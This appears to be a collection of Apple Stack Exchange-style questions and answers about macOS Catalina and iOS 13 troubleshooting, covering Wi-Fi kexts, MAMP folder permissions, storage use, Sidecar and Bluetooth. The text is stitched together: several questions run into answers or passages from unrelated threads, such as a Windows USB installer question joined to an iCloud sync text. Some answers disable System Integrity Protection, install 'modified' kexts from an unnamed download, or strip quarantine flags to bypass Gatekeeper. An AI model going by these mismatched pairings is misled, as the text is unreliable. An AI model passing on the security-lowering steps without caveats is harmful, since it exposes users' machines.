back to where it used to be. Sometimes things work better with a symlink, but in other situations I've found aliases to be the only way...\n", "Q: Word for mac: shortcuts to access Quick Access Toolbar and Ribbon I am wondering what is the shortcut to access the Quick Access Toolbar and Ribbon in Word for Mac (Office 2019, 16.29.1).

But I don't use Illustrator or other Adobe software often enough to justify the high subscription price (especially considering many bugs still don't get fixed even with this forced maintenance fee).\n\nA: It won't work anymore. Once you update to Catalina. They need to update the app to 64-bit, so we can download it again and install it on our device.\n\nA: No, I did not manage to run Illustrator CS6 in macOS 10.15 Catalina, even if CS6 is 64-bit. I have some related advice, though (hope it fits in here).\nI have an Enterprise license allowing me to install the newest versions of most Adobe software. So I uninstalled Illustrator CS6, then I ran the Creative Cloud app for installing the last version (Illustrator 23.1.1). However, it crashes after 5% of the installation process with this error message:\nFATAL: Error (Code = 151) executing in command 'CreateMacAliasCommand' for package: 'AdobeColorCommonSetRGB_1_0-mul', version:1.1.4\nFATAL: Error occurred in install of package (Name: AdobeColorCommonSetRGB_1_0-mul Version: 1.1.4).

Adobe is not able to help with this issue so far. Their main advice is to downgrade to macOS 10.14 Mojave.\nHowever, since I ran into this issue, I tried to do it in a different way on my other Mac: I updated from Illustrator CS6 to the latest version (23.1.1) before upgrading to macOS 10.15 Catalina. This worked fine, so on that computer I can run Illustrator without issues.\nSo for those who plan to upgrade to Catalina and have the ability to update to a newer version of Illustrator, my advice is to update Illustrator first.\n\nA: I have Adobe CS6 running under a virtual machine running Mac OSX El Capitan under Parallels under Catalina.  Works great.\nBasically, you buy and install Parallels into your Catalina system, then set up an older version of Mac OS X as a virtual machine, then install Adobe CS6 into that virtual machine (making sure you have previously de-activated any previous versions of CS6, and that you have an install file/disk, valid Adobe Account, and CS6 serial number).  Parallels is a $100 program that allows you to run other OS under Mac OS X.  You can find install disks for older versions of Mac OS X on the web, or at the present time you can get an install file for Mojave from Apple for free.

The solution can be found here\nbut to prevent it being lost for whatever reason I'll repost it below:\n\n\n*\n\n*Download the modified files (thanks Alex!) and unzip > you get a\nfolder named WiFi_kexts.\n\n*Boot into Recovery Mode: restart your computer while pressing and holding cmd+R\n\n*Open Utilities > Terminal via Menu Bar.\n\n*Type csrutil disable and hit return\n\n*Type reboot and hit return > computer reboots normally\n\n*Open Utilities > Terminal and enter cd and hit the space bar (don't hit return)\n\n*Drag the folder WiFi_kexts onto the Terminal window and hit return.\n\n*In Terminal, enter sudo mount -uw / and hit return, then enter your user password and hit return.\n\n*Enter sudo cp -r IO80211Family.kext /System/Library/Extensions/ and hit return\n\n*Enter sudo cp -r IO80211FamilyV2.kext /System/Library/Extensions/ and hit return\n\n*Right-click on Kext Utility in the folder WiFi_kexts and choose open, click open in the following dialog, authenticate with your\npassword\n\n*Wait for Kext Utility to complete – this took maybe two minutes on my setup, and I got an error message in the end, as well as \"All done\"\n\n*Reboot your computer and enjoy Wi-Fi in Catalina\nIf you want to turn on SIP again you can boot into recovery mode again and enter csrutil enable (hit return) reboot (hit return)\n\n\nIn summary I had to get the Wi-Fi kexts from Mojave, copy it to /System/Library/Extensions and then run the Kext Utility to do its thing after which I had my Wi-Fi back.\n", "Q: How many different images are there in a dynamic wallpaper? I just started using mac OS Catalina (just switched from Windows) and I love the dynamic wallpaper feature.\nHow many images make up the dynamic wallpaper? Does it change every 24 hours and is therefore composed of 24 different images?\n\nA: The number of images can vary depending on which dynamic wallpaper is chosen.  You can see how many images there are, for yourself.  In Finder, go to the “/System/Library/Desktop Pictures/“ folder, select whichever file you are interested in, and open it in Preview.  The dynamic wallpapers all have a file extension of ‘.heic’.\n", "Q: Sidecar not working between MBP 15' 2019 and iPad Pro 9.7' I just updated both my ipad to IpadOS and my MBP to Catalina and I'm trying to setup sidecar.\nI made sure that:\n\n\n*\n\n*both are on the same wifi network\n\n*I'm logged in with the same iCloud account on both\n\n*Bluetooth is on\n\n\nI don't have the AirPlay icon in the menu bar nor can I see the iPad in System Preferences > Sidecar.\nWhat else can I try to make it work?\n\nA: Did you try to plug the iPad on the MBP ?\nIt should work with Bluetooth connection, but just to try...\nWifi network does not have an influence on Sidecar.\n\nA: The following worked to solve the issue:\n- Logout from iCloud on both devices\n- Restart both devices\n- Login to iCloud on both deviced\n- Restart both devices\n\n", "Q: /usr/include missing on macOS Catalina (with Xcode 11) Follow up to the same problem on Mojave.\nAfter upgrading to macOS Catalina, none of the C headers can be found in /usr/include. The reason for this may be found in the Xcode 10 release notes (previous version):\n\nThe Command Line Tools package installs the macOS system headers inside the macOS SDK. Software that compiles with the installed tools will search for headers within the macOS SDK provided by either Xcode at:\n/Applications/Xcode.app/Contents/Developer/Platforms/MacOSX.platform/Developer/SDKs/MacOSX10.14.sdk\nor the Command Line Tools at:\n/Library/Developer/CommandLineTools/SDKs/MacOSX.sdk\n[...]\n  As a workaround, an extra package is provided which will install the headers to the base system. In a future release, this package will no longer be provided. [...]\n\n(See the link to the question above for details on this suggested workaround.)\nApparently Apple made good on their threat with Xcode 11. How can one install the C headers to /usr/include on macOS Catalina using Xcode 11?\nContext: The clang python binding search the header files in /usr/include per default. According to kkurian's answer and the comment I made (in response to this question), there are multiple ways to control this behaviour, if necessary. \nRelated question: Can't compile C program on a Mac after upgrade to Mojave.\n\nA: Set the CPATH environment variable in your shell (e.g., put this in your .zshrc assuming you're using zsh):\nexport CPATH=`xcrun --show-sdk-path`/usr/include\n\nAnd then try to build your project again.\nUPDATE\nThe OP related to how to install the headers in /usr/include, not how to point clang to the headers wherever they may be.\nMacOS System Integrity Protection prevents the creation of /usr/include, even by root. See this related answer.\nIf you disabled SIP (not recommended) then I imagine something like\nsudo ln -s `xcrun --show-sdk-path`/usr/include /usr/include\n\nwill do the trick.\n", "Q: Free up disk space during Catalina update I tried updating to Catalina, but it got stuck on not having enough disk space. It says I have to quit the installer, select a start disk and boot from that, but my system's drive is not in the list of drives that I can select...\nSo, instead, I started the Terminal, went to the drive through that and I started deleting things. But every time I run df I don't see a change in the amount of disk space. Between reboot changes are persisted though, even creation of new files. \nI then installed Mojave on an external drive and mounted the internal drive, it shows up as 52GB free (vs 12GB from df). But when I run df I still see only 12GB free.\nI figure there is some sort of place where deleted files are getting moved to in order to provide me with some fancy restore magic for when the installation is done. Where is this magical place and how do I delete files from there so that I can continue the installation?\nThe answers here don't address my issue because I already know what was eating my disk space.\n\nA: So, after a few hours of working on this (mainly making rsync backups) I have it working.\nWhat was crucial was creating a new macos installation and mounting the old disk on that. I didn't really delete any files and df kept showing the same amount of free space, but after a reboot to the original disk the install passed.\nI think it has something to do with things being purged by the new macos install (Mojave on an external drive).\n", "Q: Synced video in photos app doesn't load in airplane mode I've got a weird problem with Photos App, either on iPhone and iPad.\nI have all my photos on iCloud.\nOn both my iPhone and iPad, I checked \"Download and keep originals\", in order to keep everything on the device.\nThat is working correctly with photos, but not videos !\nFor example, if I take a short video with my iPhone, it appears a little bit later on the iPad thanks to iCloud synchronization.\nI can read the video on the iPad, but as soon as I turn airplane mode ON, I can't read it anymore.\nThis is not a storage problem as I have a lot, and I even reset completely the device, but still got the problem.\nUpdating to Catalina and iOS 13 didn't fix the problem too.\nApple support admits the problem, but they are not able to solve it for months...\nDoes anyone experience the same problem or has an idea ?\n\nA: Apple Community says this: \nDouble click your home button and clear all open apps by swiping up. Then let’s go to settings>iTunes and app store and tap your Apple ID and sign out. Restart your device and then sign back in. Once done make sure wifi is turned on and go to the downloaded video application and make sure your downloaded content appears. Then go to airplane mode and check if the content still plays. Then clear app again and relaunch and test whilst still in airplane mode.\n", "Q: Bluetooth is not working (maybe reconnecting ...) after update, on my MacBook Pro 15 inch mid 2015, from 10.14.5 to 10.14.6 my bluetooth stoped working. All of my 5 devices were listed in the System preferences -> Bluetooth, but I could only see their addresses (12 letters). There was no button to connect to any of my device.  \nI tried: \n\n\n*\n\n*Removing .plist files (~/Library/Preferences/com.apple.Bluetooth.plist, ~/Library/Preferences/ByHost/ com.apple.Bluetooth.XXX.plist)\n\n*Resetting SMC\n\n*Resetting  bluetooth module + Removing all devices\n \nBut none of them helped to solve my issue. In 10.14.6 when I clicked on Remove all devices (Bluetooth Debug option) I didn’t see any device in System preferences, but when I restarted Mac I did see them (addresses).\n\n\nI hoped that this bluetooth problem would resolve Catalina, but it doesn’t. Bluetooth is still not working, only change is that after I removed all devices and after restart I didn’t see devices (addresses).\nIn Catalina I can only see my bluetooth mouse and when I click on connect button, I can see how it is trying to connect, but not successfully (changing text from Connected to Not Connected repeatedly ... this problem I didn't have in 10.14.6). I can only see that mouse, any other devices are not shown. \nDo you have any ideas how it could be fixed? Any idea would be very appreciated. \nThank you\n\nA: Reset PRAM/NVRAM after updating to Catalina so that any old data should be removed from the cache.\n\n\n*\n\n*Shut down your Mac.\n\n*Turn it on and immediately press and hold these four keys together: Option, Command, P, and R.\n\n*You can release the keys after about 20 seconds, during which your Mac might appear to restart.\n\n\nIt will resolved your issue. This solution worked in a couple of Macbooks of my colleagues after upgrading. \n", "Q: Does Catalina synch and backup devices running iOS 12? I've got one of the first generation iPad Airs and it will only update to iOS 12.4.2.  I'm trying to back it up and synch it using my iMac on which I've installed Catalina (10.15). The iPad shows in the sidebar of Finder but when I click on it, after a minute of waiting I get a message saying \"The selected device could not be found.\"  I have no problem backing up and synching my iPhone which is running 13.1.2 and I've had no problems backing up and synching this iPad in the past.

(This means that iOS devices are shown in the Sidebar.) The Mac and the iPad are both connected to the same network, too.  \nSo, for instance, I can't sync the iPad in Music and Sidecar doesn't work as the iPad just doesn't show up in the window. Both of these things work over USB.\nDoes anybody have insight as to what might be going on? Thanks!\n\nA: Relaunch the Finder.

It's on the same panel as where you checked \"Definitions\"\nIf that doesn't get it, check the box for applications and be sure you have a dictionary in your applications folder.\nWhen I do a spotlight search on my iMac of the word obtuse, for example, it gives me the definition from my dictionary app. So some way it actually looks inside or uses my dictionary app.\n", "Q: How to create bootable Windows 10 installer USB for PC?

So i have one iCloud account and two Macbooks : one mac for work, another for personal use.\nI want to use iCloud as cloud backup on both Macbooks, BUT i don't want one Mac to download content of another. \nFor instance, in work's Mac i have a folder with almost 100GB, that is useless for me on personal Mac.

Time machine not to blame. What's taking up so much space? So, I found a number of threads related to System files on Macs taking up to much space, and it seems for most people they are related to Time Machine snap shots. However, when I run sudo tmutil listlocalsnapshots / it returns nothing.\nHere's what it show in the Storage tab of About my Mac:\n\nThe gray bar is labelled \"System\" and it's taking up nearly 200 Gb of space.\nI downloaded OmniDiskSweeper to get an idea of what's going on, and this is where it gets weirder.\n\nIn the drive list, it says 223 Gb are being used, but after sizing everything it says only 95 Gb are being used, and System files are just under 7 Gb.\nWhat gives?

I can't even get into the directory (sudo does nothing, and sudo chown doesn't allow me to cd into either...)\n\nA: I don't think TimeMachine backups are stored elsewhere but on my machine, the Library folder takes up 100 GB! It may be included in the system size but OmniDiskSweeper separates it out. I've asked about the library folder being so large but didn't get an adequate response. I don't know how to safely reduce the size of that folder.\nYou should check the results of OmniDiskSweeper to see if your Library folder is taking up a lot of space. You have 2 library folders.

Any tips on quickly viewing the current month's/year's calendar in catalina. \nThank you.\n\nA: I feel your pain - I used the calendar in the dashboard a lot - and there's no sensible way of doing it with the in built functionality. I looked up Fantastical 2 - but I'm not prepared to pay 80 bucks for something that used to be free... So I found Quick View Calendar in the app store.

As I understand, HFS+ and APFS volumes don't need to be defragmented, as files will automatically defragmented by the OS, but I'd like to leave a process running in the background that would do this to all files of the disk. Is there a way to check which files have more fragments or get a list of all files of the disk?\n\nA: It is correct that on HFS+ volumes a technique named \"On-the-fly\" automatically defragments certain files when they're opened. However, it only applies for files that are less than 20 MB in size, are not busy, not read-only, have been unchanged for at least 60 seconds and has more than 8 extents (i.e. \"fragments\"). Typically those files will occupy a very small percentage of your hard drive.\nIn order to get statistics and list of fragmented files on HFS+ volumes, you'll want to use a tool like \"hfsdebug\" (free). It offers both listing of all fragmented files, as well as various statistics such as top lists of most fragmented files.\nIn order to get the list of all fragmented files that you seek, run the following command in Terminal.app after installing hfsdebug:\nhfsdebug -f /\n\nYou can choose to see only the top 10 files like this:\nhfsdebug -t 10 -f /\n\nA newer tool named fileXray (79$) also exists that gives you much of the same features, and plenty more. As noted it is commercial software that requires you to purchase a license - note that it does not have a GUI, but has a textual interface similar to hfsdebug.\nYou can use fileXray to for example check if a file is fragmented or not:\nfileXray filename\n\nThis will output a list of extents for the file \"filename\". If the file has multiple extents it is in theory fragmented. If the startBlock + blockCount of an extent lines up with the startBlock of the next extent, then in practice it doesn't matter much.\nA simple way to do the actual defragmentation is to simply copy the file. Ensure that you have enough (non-fragmented) disk space in advance, and then copy the file to a new name on the same disk. The new file should be less fragmented (or not fragmented at all) - you can check that with the above mentioned command. After copying, you can remove the old file and rename the new file to match.\nUPDATE: In the comments, you have expressed that you needed a free solution, and cannot use fileXray because it costs 75$. In that case you could use SleuthKit from HomeBrew instead - you'll find the ifind command from SleuthKit can list the number of extents as well. Another possibility is hfsinspect by Adam Knight, which can also list the extents.\n\nA: According to, https://web.archive.org/web/20200103161738/http://osxbook.com/book/bonus/misc/optimizations/#FIVE files are defragmented on open if all the conditions below are true:\n\n*\n\n*the file is less than 20 MB in size\n\n*the file is not already busy\n\n*the file is not read-only\n\n*the file has more than eight extents\n\n*the system has been up for at least three minutes\n\nIf that still holds, a simple way to defragment a folder would be, from the terminal:\nfind . -type f -exec head {} > /dev/null \\;\n\nAs this will read the start of every file within that folder and do nothing with it. Since it requires opening the file, it should trigger the defragmentation and hot file clustering behaviors for all writable files below 20 MBs.\nI can't really tell whether it works.\n", "Q: macOS Catalina doesn't allow MAMP permission to certain folders (Documents, Downloads, Desktop) I have been using MAMP for a few years now, I just updated to macOS Catalina, it seems that macOS Catalina is blocking permissions to the Documents folder among a few others (such as Downloads and Desktop).\nI have already checked the permissions on these files with terminal and that doesn't seem to be the issue.\nAdditionally I have \nThe server gives me this error:\nForbidden\n\nYou don't have permission to access /Users/xxx/Downloads/index.html on this server.\n\nThe Apache log gives me this error:\n[Wed Oct 09 12:31:30 2019] [error] [client ::1] (1)Operation not permitted: file permissions deny server access: /Users/xxx/Downloads/index.html, referer: http://localhost/Users/xxx/\n\nIt seems to be an issue with the way macOS is restricting permissions to certain directories. In the settings panel under Security and Privacy there are additional settings for file access, I have granted MAMP those permissions, in addition I have also went inside the MAMP folder and granted Apache's httpd the same permissions, still no luck.\nDoes anyone have a work around? This is causing me such a headache in development.\n\nA: I have the same issues. Updated MAMP to the latest build (5.5). Also switched the ports back to MAMP default ports (8888). That worked for me. Also checked if some diffrent server was running on port 80 lsof -nP -i4TCP:80 | grep LISTEN but nothing seem to be using port 80. Could it be Catalina has a new security setting for this?\n\nA: Same issue here.\nSolution: Move your folders into another path (example: Home), don't use Documents or Download or other system folders.\nenjoy\n\nA: Also had Apache not starting after upgrade to Catalina. I had my websites originally located in subfolders of the /Users/***/Sites/ folder, and according to this thread, made a new folder /Users/***/Repos and moved all websites there and updated MAMP Pro doc roots for all hosts. That didn't allow Apache to start.\nAfter that, I found this info:\n\nCheck your Template folder, located in /Users/[username]/Library/Application Support/appsolute/MAMP PRO/template/httpd.conf.temp. Rename this file to httpd.conf.temp.bak and try to restart your Apache server.\n\non this page https://appsolute.zendesk.com/hc/en-us/articles/215197286-My-Apache-Server-will-not-start-\nand after doing that, Apache in Mamp Pro was able to start on Catalina.\n\nA: Catalina has more restrictions on system folders which we can apply an exception:\n\n\n*\n\n*Open System Preferences -> Security and Privacy -> Privacy tab -> Full Disk Access -> Press 'Unlock to make changes' padlock\n\n*Open Finder Window -> \"Go\" menu -> \"Go to folder\" -> type \"/usr/sbin/\"\n\n*Drag the file \"httpd\" to the list inside the Full Disk Access settings.\n\n*Restart Mamp servers\n\n\nA: I have the same issue after update but didn't find any solution yet. For now I moved all my projects into a new folder in root. This one worked for me so far.\n\nA: Several applications (GIMP for example) are not working also (they can't access \"special\" folders like: ~/Desktop, ~/Documents and ~/Downloads, but other locations seem to work OK). I believe this is a \"complementary feature\" bestowed by the newly-released Catalina.\nUpdate Different.\n\nA: Got this problem too. Same as @ecraciun I have moved my project into /Users/MyUser/Project and now it's work!\n", "Q: Move pictures to albums and shared albums in iOS 13 I used to be able to select pictures, hit share and then be able to put them in personal or shared albums using the iOS Photos app. Now in iOS 13, I can’t see the Photos link anymore.\nHow can I do this in iOS 13? I know I can go to the album and hit +, but this workflow is reversed and I would have to find my photos again.\n\nA: I now see the ”Edit actions” link. Don’t know if that came with the 13.1.2 update or if I just missed it before. But from there I can add the missing actions. I don’t know why they went away after the update but I now added them back and everything works as expected.\n", "Q: System storage keeps on increasing I am running macOS Mojave 10.14.6 (Supplement 2).\nI have not faced any extraordinary system storage issues like some other posts on the site which say that their system storage is around 150+ GB. However, every now and then I check my system storage usage and the number keeps on increasing. As per my memory, initially (a month ago), system storage usage was around 30 Gigabytes. 2 days back, storage management reported it to be 40 GB. Today, the system storage shows around 42.5 GB used. I don't understand what his happening and since I have a small SSD on my MacBook this storage increase effect is very annoying.\nWhat should be the ideal system storage usage on macOS Mojave? How can I fix this to get back my lost storage? Will upgrading to macOS Catalina further increase system storage usage?\nI have installed DaisyDisk as per recommendations on similar questions but I don't see how to 'fix' anything from DaisyDisk. (I am on the trial version)\nThere is 4 GB of space in 'other volumes' but I haven't partitioned my SSD till date. Is this storage used by the OS as swap?\nHere's a screenshot:\n\nNote: It would be great if solutions do not require installing 3rd party apps unless necessary, thanks! \n\nA: I had a computer that I wiped and still had this issue.  I then moved to a machine I had used for years and noticed the system data was also increasing.  I waited longer, and then a lot of the system data was converted into Document data.  So I think as the system was indexing, it labeled my regular data as system data until its indexing was completed.  I might check the problematic machine and see if it relabels the \"system data\" to be \"document\" data or other data over time.\n", "Q: Upload to iCloud Photos without adding to Recents album? I'm trying to upload my photo album from my Hard Disk to iCloud, and make it accessible from my iPhone. \nHowever, all the photos uploaded to an album are automatically added to my \"Recents\" album on my iPhone (in addition to the album itself).\nI would like to use iCloud as a cloud storage service and be able to see the photos from my iPhone but without having them in \"Recents\" album.\n\n\n*\n\n*macOS version: Catalina\n\n*iOS version: 13.1.2\n\n\nCan this \"Recents\" album be suppressed / disabled or otherwise made not so prominent?\n\nA: It's true that the Recents album does show imported photos first, regardless of when those photos were originally taken. I'm always slightly annoyed by this when I import an older SD Card from my camera.\nTry to ignore the Recents album.\nInstead, use the Photos tab section in the main view. These photos are arranged by date.\nIn iOS 13, they are given a nice Years / Months / Days view to quickly zoom in to times and events.\n \n", "Q: macOS Catalina: \"App is damaged and can't be opened. You should move it to the trash.\" Experiencing a problem with several apps after installing macOS Catalina.\nWhen the app is downloaded from the internet I get the error:\n\n\"APP NAME\" is damaged and can't be opened. You should move it to the trash.\n\nAny workarounds to bypass macOS gatekeeper for specific apps?\n\n\nA: Here's the solution. Open Terminal and run:\nsudo xattr -rds com.apple.quarantine /Applications/Coherence\\ Pro.app\n\nIf the path to the program is different, then obviously change it so that it's pointing to your app. For me, I've had several apps not working after the update to macOS Catalina. This takes care of that problem though.\nHere's more info about xattr and what the flags mean.\nhttps://ss64.com/osx/xattr.html\n", "Q: Am I still on iOS 13 beta? I have an iPhone XS which I updated to iOS 13 beta on early August (perhaps around beta 5) and I have been receiving updates. \nAt this moment, I think I should have received iOS 13 stable already but I think I haven't. \nI think I'm still on the beta release and want to know how I would get on a current / stable build of iOS from here.\n\n\n\n\nA: Yes, you're still running beta software (at this point in time 13.2 is a beta version).\nYou can remove the beta by following Apple's instructions here:\nhttps://support.apple.com/en-gb/HT203282\nThe easiest method there is to open Settings > General, tap Profiles & Device Management, tap iOS Beta Software Profile and then tap Remove Profile. Afterwards you need to reboot the phone.\nNow the next time Apple releases a non-beta version of iOS, you'll be able to update to it from the normal Software Update.\nIf you want to remove the beta right away and install a non-beta version, you'll need to erase and restore the device. You'll want to ensure that you have an up to date backup before erasing, and then restoring from that after restoring the system.\nThe easiest way to do this is to connect your iPhone to your computer, and then put your iPhone in recovery mode (press and quickly release the volume up button, press and quickly release the volume down button, then press and hold the side button until you see the recovery mode screen). From iTunes (or Finder if you're on Catalina) choose to Restore the phone, which erases the device completely and installs an up to date, non-beta version of iOS.\n", "Q: How to change the charging chime on MBP (PowerChime.app) Many people want to disable the charging chime introduced with the USB-c MBP's (and some enable on non-USB-c). I, however, want to change the chime. \nSadly however I can't change anything in \"PowerChime.app\" even after disabling the SIP (startup CMD+R, terminal > csrutil disable). I also can't \"swap\" the PowerChime.app app.\nDoes anyone know a solution for this?\n\nA: I had the same exact question, Googled it, landed on here and found the answer hours later, lol.\nIf you're still looking for the answer, or for anyone's future reference -- after disabling SIP and restarting, open terminal and run:\nsudo mount -uw /\nkillall Finder\n\n... and you're good to go. Just proceed to replace the .aif file in \"Powerchime.app\". For me, I changed mine to the old iOS charging chime!\nHaha \n", "Q: Mission Control stopped working then Dock won't restart i am using a macbook air and with yosmite os\nAt first I could still switch between desktops, just that i could not swipe up/down to access mission control and app exposé. I tried typing in killall Dock into terminal to restart dock, but now i cant switch desktops either and the background is completely black. killall dock just tells me it can't find the process for this user. when i typed in killall -s dock it showed only one process.\nis there a way to force dock to start and fix mission control?\n\nA: This was happening to me for a long time and I did some research and found out how to fix it. Go into terminal and run the following commands.\ndefaults write com.apple.dock mcx-expose-disabled -bool FALSE\nkillall Dock\n\nThis should fix all of your problems.\n", "Q: Spawning multiple instances of applications via shortcuts So I'm using BetterTouchTool to set up shortcuts, and I have a bunch that are dedicated to opening various apps. The problem is, if one of those apps are already open, then hitting the shortcut pulls that instance into focus, rather than spawning a new one. \nThis is especially annoying since I use multiple desktops heavily-- If I'm on desktop 6 and want to spawn a terminal window, but one is already open on desktop 1, then it moves me back to desktop 1 rather than creating a new terminal instance. I'm used to working on Ubuntu, where I have many terminals open across my virtual desktop. \nI do realize that questions to this effect have been asked before, but I'm looking for a general solution that could apply to, say, Chrome, just as well as Terminal. On second thought, I don't need a truly general solution; I only need this to work for Terminal and Chrome.\nI'll stress that this question is asking how to achieve this with keyboard shortcuts, rather than solutions that involve any mouse actions on the Dock.\n\nA: you can open a file from the terminal by using the open command. For example to open the Atom editor you could type open -a /Applications/Atom.app/Contents/MacOS/atom. To open another instance of the app, use the -n option with open. For example, to open another instance of Atom type: open -n -a /Applications/Atom.app/Contents/MacOS/atom.\nI suppose a script could be written to execute this and then a keyboard shortcut for the script could be set.\n", "Q: Can't unmount external disk used with Music app due to AMPLibraryAgent process I use an external storage disk for my Music library in macOS 10.15 Catalina, because the required file size is several times my internal SSD. After upgrading to Catalina, now when I connect the drive to use Music, I cannot eject the drive afterward, due to a lock by the AMPLibraryAgent process. Here is terminal output detailing the issue:\ndiskutil unmountdisk /dev/disk2\nUnmount of disk2 failed: at least one volume could not be unmounted\nUnmount was dissented by PID 710 (/System/Library/PrivateFrameworks/AMPLibrary.framework/Versions/A/Support/AMPLibraryAgent)\nDissenter parent PPID 1 (/sbin/launchd)\n\nHow can I remove this lock without quitting that service process or shutting down my computer?\n\nA: You can try force unmounting the drive. It unmounts the drive if some process is already using it.\ndiskutil unmountdisk force /dev/disk2\n\n\nA: I'm having exactly the same issue with my Music(iTunes) Library on my external Drive due to space reasons. macOS 10.15.4 \nMy dodgy workaround is that I have a created a routine with Automator which quits the AMPLibraryAgent process with one click. \nDid anyone find a better solution? \n\nA: I'm running into the same issue, with Catalina 10.15.2. One slight workaround, sort of, that I found is that instead of having to reboot the machine to cleanly eject the drive, I can log out and then log back in, and then it's been freed up for ejecting. Of course I'd rather not have to do that.   But this seems to be a bug that I hope will be fixed.\n\nA: This solved the problem for me:\nlaunchctl stop com.apple.AMPLibraryAgent\n\n", "Q: macOS Catalina causing \"find: .: Operation not permitted\" errors I have an automation workflow that I use as a Quick Action.

I created a periodic script that was running under /etc/daily.local. This was on macOS Catalina. It had the following line:\nfind \"/Users/brianc/Downloads\" -Btime +3d -name 'GBH4SN2*.rdp' -type f -print\n\nAnd when the script ran, I would see the following:\nfind: /Users/brianc/Downloads: Operation not permitted\n\nSo, I granted Full Disk Access (System Preferences > Security & Privacy > Privacy > Full Disk Access) to find. No difference. Granted FDA to bash. No difference. Granted FDA to sh. No difference. Finally, by going through all the different scripts, I found that periodic scripts are run under /usr/libexec/periodic-wrapper which is executed from /System/Library/LaunchDaemons/com.apple.periodic-daily.plist. So, I granted FDA to periodic-wrapper.

You break the convention that the files belonging to a user are located in his or her home directory.\nIf you „retire“ a user, only files and folders in their home directory are saved.\nCatalina, for example, plainly forbids creating folders in the root directory (/).\nTo make a long story short: There are reasons for the home directory. Do not fight those. I for my part enjoy the peace of mind this gives me. And the fact that I do not have to search all over the OS.

Because I usually just use one side of the Airpods, so that I am aware of the environment whenever I exercise or in a cafe, can only one side of the Airpods be used independently, while the other one is left at home?\nSo if one side of the Airpods is lost for some reason, you can still use the other side independently?\n\nA: Yes, AirPods can be used independently in only one ear.\nI use only one AirPod the majority of the time. Great for mono podcasts and for environmental awareness as you're walking around.\n", "Q: What effect does upgrading RAM or the Processor have on the performance of a computer? I am considering buying a macbook pro and have the budget to upgrade either the RAM to 16 gb or get the faster processor, but not both. So I wonder: In what sort of tasks is the performance improved if I upgrade RAM vs. if I upgrade the processor?\nPs: My only really heavy weight application which I use is Lightroom and sometimes Photoshop\n\nA: You should definitely upgrade your RAM.\nThe performance improvement of replacing your CPU is minor, and will only be seen while running tasks that require consistent processing, which most modern uses do not.\nYou can check for yourself how many times your CPU reaches 100% of its usage.\nUpgrading your RAM will enable your computer to cache more stuff, hence run a lot faster, and in addition, you will be able to hold much more programs running while still not getting any significant slowdown.\n", "Q: revoke forbiddance to send Apple events to System Events I have been using Gitk provided by Git provided by Homebrew with success, for several years.\nA couple of days ago, it suddenly prompted a security window when called.\nI did not allow access, hoping I would be able to change my mind.\nNow trying to start Gitk will always cause:\n$ gitk --all\nError in startup script: 58:103: execution error: Not authorised to send Apple events to System Events.

Both devices are logged into iCloud with the same AppleID. Both devices have two-factor authentication enabled.\n\nWhy could it be that I cannot connect wirelessly?\n\n\nA: To use Sidecar wirelessly, place your iPad to the left or right of your Mac. Then click on the AirPlay icon in your menu bar.\nIf you have an AirPlay icon, you'll see Connect to in its dropdown menu, with the name of your iPad next to it. Click on that, and you're done.\nDepending on how your Mac is set up and whether you've ever used AirPlay before, you may not see the icon, though.\nIf you don't, go to any open Finder window. Press and hold on the green traffic light icon. You'll see a new dropdown menu that includes options to rearrange the window on the screen —or to Move to your iPad. Do that, and Sidecar is working.\nAlso, having done this, you'll now have the AirPlay icon in your Mac menu bar and from now on can use it to connect and disconnect to this iPad.\nhttps://support.apple.com/en-us/HT210380\nhttps://www.apple.com/macos/catalina/docs/Sidecar_Tech_Brief_Oct_2019.pdf\n", "Q: How to use keyboard shortcut to copy formatting in Mac Word According to this microsoft support page (shown in the animated gif at right below) \n\nTo use keyboards shortcuts to copy formatting, press COMMAND + SHIFT + C to copy the formatting, select the text that you want to apply the formatting to, and then press COMMAND + SHIFT + V to paste the formatting\n\nHowever, as shown in the animated gif below (click for better detail), it does not work for me. I describe what I'm doing with the keyboard with the text in black, blue, and red. \nNotice at the end that I am able to paste format using the format painter tool, but my goal is to use keyboard shortcuts to do this. To demonstrate that this is not due additional custom shortcuts on my system, I have the shortcuts portion of the System Preferences open and you can also see the normal paste shortcuts in the Edit menu during the animated gif.\n\nI'm using an updated Microsoft Word for Mac version 16.29.1 on an Office 365 subscription with macOS 10.14.6.\n\nA: If a shortcut doesn't work as expected (i.e. as mentioned in the help text/manual) check whether you configured the same shortcut as global shortcut in System Preferences > Keyboard > Shortcuts. If you set up a \"concurrent\" shortcut it may also occur in Services, Screenshot etc.\nAlso check the app's preferences whether you set up custom shortcuts which override the app's default shortcuts.\n\nIt's not necessary to set up a custom shortcut for Word's Paint Format tool double click.\nThe logic behind the Paint Format tool button compared to the default shortcuts works like this:\n\n\n*\n\n*Choosing some formatted text and clicking Paint Format tool (1st click) equals cmdshiftC (copy format)\n\n*Choosing another part of the text (\"2nd click\") equals choosing some text and cmdshiftV (paste format) - the Paint Format tool button is resetted afterwards!\n\n*Choosing some formatted text and double-clicking Paint Format tool and formatting several other text parts afterwards equals cmdshiftC and several cmdshiftV.\n\n\nIf you copy a text format/style with cmdshiftC (or with the 1st click on Paint Format tool!) it will remain in the \"format/style pasteboard\" until you copy another text format/style or quit Word.\nYou can apply it with Paint Format tool only once (2nd click) but with the shortcut as often as required.\n", "Q: How to read the backups history of my iPhone? I am regularly making backups of my iPhone otarie on a Mac through an USB cable.\nVersions of the OS used:\niOS   11.1\nMacOS 10.13.5\n\nI am not using iCloud.\nWithin iTunes I often see many backups apparently started (or terminated)\nat the same date and hour:\n\n\nWhat are all these backups?\nWhat are the dates on left and right columns?\nWhich of these backups are partial or full?\n\nA: iTunes only saves 1 active-backup from your iPhone. Each time you back it up, it is archiving the data that was on the device at the time, this is where the dating of the previous backup comes into play.\nThe dated backups are typically those that have been used for a restore. When you do this the restored backup is archived with the date of the restore and a new rolling backup is created. With iTunes for Mac, you can also trigger the archive process manually. You can select and delete older backup as you chose, though I would suggest you keep one or two.\nThis \"archiving\" is Apple's way of \"copying or duplicating\" an iTunes backup file without the user having to physically rename that backup file or physically moving the backup file into another location. \nIt's similar to how Time Machine on a Mac performs when archiving files.\n", "Q: Using Preview with an old PDFkit With Mojave, I use to open multiple pdf at once with the old Preview9.0.app  (version of Sierra) \nIt doesn't work anymore with Catalina because of a conflict between Preview9.0.app and the new PDFkit framework. \nIs there any way to embed the old PDFkit framework in Preview9.0.app ? Or redirect PDFkit calls to the old one ?\n\nA: I'm sure it was possible ! Cormiertyshawn895 dit it ! Thanks to him ! https://github.com/cormiertyshawn895/Retroactive/issues/1\n\nA: Preview, like many other Apple-bundled apps, is designed to use the Operating System's frameworks. There is no practical way that the application can be 